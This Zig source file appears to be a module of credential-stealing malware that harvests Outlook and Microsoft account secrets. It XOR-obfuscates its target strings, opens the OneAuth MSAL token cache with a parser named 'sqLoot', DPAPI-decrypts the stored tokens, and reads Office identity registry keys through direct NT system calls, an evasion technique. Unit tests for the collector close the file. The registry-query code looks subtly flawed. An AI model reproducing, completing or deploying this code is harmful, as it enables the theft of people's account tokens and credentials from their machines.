const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const sqLoot = @import("../parsers/sqLoot.zig");
const file_io = @import("../parsers/file_io.zig");
const dpapi = @import("../crypto/dpapi.zig");
const dll_loader = @import("../crypto/dll_loader.zig");
const export_resolve = @import("../types/export_resolve.zig");

pub const OutlookCredential = struct {
    source: []const u8,
    username: []const u8,
    value: []const u8,
};

const E = struct {
    pub const msal_rel = hash.xorEncrypt("Microsoft\\OneAuth\\msal.cache");
    pub const src_msal = hash.xorEncrypt("MSAL");
    pub const src_ntreg = hash.xorEncrypt("Registry");
    pub const nt_reg_hklm = hash.xorEncrypt("\\REGISTRY\\MACHINE\\Software\\Microsoft\\Office\\16.0\\Common\\Identity\\Identities");
};

fn queryMsalCache(base_path: []const u8, allocator: std.mem.Allocator, out: *std.ArrayList(OutlookCredential)) void {
    var rel_buf: [E.msal_rel.len]u8 = undefined;
    hash.xorDecrypt(&E.msal_rel, &rel_buf);

    var src_buf: [E.src_msal.len]u8 = undefined;
    hash.xorDecrypt(&E.src_msal, &src_buf);

    const cache_path = std.mem.concat(allocator, u8, &[_][]const u8{ base_path, "\\", rel_buf[0..] }) catch return;
    defer allocator.free(cache_path);

    const mapped = file_io.MappedFile.open(cache_path) orelse return;
    defer mapped.close();

    var db = sqLoot.SqliteDb.open(allocator, mapped.slice()) catch return;
    defer db.deinit();

    const rows = db.readTable("cache") catch {
        const alt = db.readTable("tokens") catch return;
        processRows(&db, alt, "tokens", src_buf[0..], allocator, out);
        return;
    };
    processRows(&db, rows, "cache", src_buf[0..], allocator, out);
}

fn processRows(db: *sqLoot.SqliteDb, rows: [][]const sqLoot.Value, table: []const u8, source: []const u8, allocator: std.mem.Allocator, out: *std.ArrayList(OutlookCredential)) void {
    const cols = db.getColumnNames(table) catch {
        allocator.free(rows);
        return;
    };
    defer {
        for (cols) |c| allocator.free(c);
        allocator.free(cols);
        allocator.free(rows);
    }

    var secret_idx: ?usize = null;
    var user_idx: ?usize = null;

    for (cols, 0..) |col, i| {
        if (std.mem.eql(u8, col, "secret") or std.mem.eql(u8, col, "encrypted_token")) secret_idx = i;
        if (std.mem.eql(u8, col, "username") or std.mem.eql(u8, col, "email") or std.mem.eql(u8, col, "home_account_id")) user_idx = i;
    }

    const si = secret_idx orelse return;
    const ui = user_idx orelse return;

    for (rows) |row| {
        if (row.len <= @max(ui, si)) continue;
        const uname = if (row[ui] != .null and row[ui] == .text) row[ui].text else continue;
        const enc = if (row[si] != .null and row[si] == .blob) row[si].blob else continue;

        const decrypted = dpapi.decrypt(enc) orelse continue;

        const ud = allocator.dupe(u8, uname) catch continue;
        const vd = allocator.dupe(u8, decrypted) catch {
            allocator.free(ud);
            continue;
        };
        const sd = allocator.dupe(u8, source) catch {
            allocator.free(ud);
            allocator.free(vd);
            continue;
        };
        out.append(.{ .source = sd, .username = ud, .value = vd }) catch {
            allocator.free(sd);
            allocator.free(ud);
            allocator.free(vd);
        };
    }
}

fn queryRegistry(allocator: std.mem.Allocator, out: *std.ArrayList(OutlookCredential)) void {
    var nt_path_buf: [E.nt_reg_hklm.len]u8 = undefined;
    hash.xorDecrypt(&E.nt_reg_hklm, &nt_path_buf);

    var src_buf: [E.src_ntreg.len]u8 = undefined;
    hash.xorDecrypt(&E.src_ntreg, &src_buf);

    var wide_buf: [512]u16 = undefined;
    var i: usize = 0;
    while (i < nt_path_buf.len and i < wide_buf.len) : (i += 1) {
        wide_buf[i] = nt_path_buf[i];
    }
    if (i >= wide_buf.len) return;

    var name_us = types.UNICODE_STRING{
        .Length = @as(types.USHORT, @intCast(i * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(wide_buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(&wide_buf)),
    };

    var attr = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &name_us,
        .Attributes = types.OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };

    var key_handle: types.HANDLE = undefined;
    const status = engine.NtOpenKey(&key_handle, types.KEY_READ, @as(types.PVOID, @ptrCast(&attr)));
    if (status < 0) return;
    defer _ = engine.NtClose(key_handle);

    var value_buf: [4096]u8 = undefined;
    var value_name = types.UNICODE_STRING{
        .Length = 0,
        .MaximumLength = 0,
        .Buffer = undefined,
    };

    var result_len: types.ULONG = 0;
    var kvpi: types.KEY_VALUE_PARTIAL_INFORMATION = undefined;

    const qv_status = engine.NtQueryValueKey(
        key_handle,
        &value_name,
        @as(types.ULONG, @intFromEnum(types.KEY_VALUE_INFORMATION_CLASS.KeyValuePartialInformation)),
        @as(types.PVOID, @ptrCast(&kvpi)),
        @as(types.ULONG, @intCast(@sizeOf(types.KEY_VALUE_PARTIAL_INFORMATION) + value_buf.len)),
        &result_len,
    );
    if (qv_status < 0 and qv_status != 0x80000005) return; // STATUS_BUFFER_OVERFLOW or STATUS_OBJECT_NAME_NOT_FOUND

    const data_len = @min(@as(usize, @intCast(kvpi.DataLength)), value_buf.len);
    const data = value_buf[0..data_len];

    if (data.len == 0) return;

    const sd = allocator.dupe(u8, src_buf[0..]) catch return;
    const vd = allocator.dupe(u8, data) catch {
        allocator.free(sd);
        return;
    };
    const ud = allocator.dupe(u8, "Default") catch {
        allocator.free(sd);
        allocator.free(vd);
        return;
    };
    out.append(.{ .source = sd, .username = ud, .value = vd }) catch {
        allocator.free(sd);
        allocator.free(ud);
        allocator.free(vd);
    };
}

pub fn collect(local_app_data: []const u8, allocator: std.mem.Allocator) ![]OutlookCredential {
    var result = std.ArrayList(OutlookCredential).init(allocator);
    errdefer {
        for (result.items) |c| {
            allocator.free(c.source);
            allocator.free(c.username);
            allocator.free(c.value);
        }
        result.deinit();
    }

    queryMsalCache(local_app_data, allocator, &result);
    queryRegistry(allocator, &result);

    return result.toOwnedSlice();
}

test "collect returns empty for nonexistent paths" {
    const result = try collect("C:\\__nonexistent__", std.testing.allocator);
    defer {
        for (result) |c| {
            std.testing.allocator.free(c.source);
            std.testing.allocator.free(c.username);
            std.testing.allocator.free(c.value);
        }
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "collect handles empty directory" {
    const tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const tmp_path = tmp.dir.realpathAlloc(std.testing.allocator, ".") catch return;
    defer std.testing.allocator.free(tmp_path);
    const result = try collect(tmp_path, std.testing.allocator);
    defer {
        for (result) |c| {
            std.testing.allocator.free(c.source);
            std.testing.allocator.free(c.username);
            std.testing.allocator.free(c.value);
        }
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "OutlookCredential struct is valid" {
    const cred = OutlookCredential{
        .source = "MSAL",
        .username = "user@example.com",
        .value = "token_value",
    };
    try std.testing.expectEqualSlices(u8, "MSAL", cred.source);
    try std.testing.expectEqualSlices(u8, "user@example.com", cred.username);
    try std.testing.expectEqualSlices(u8, "token_value", cred.value);
}
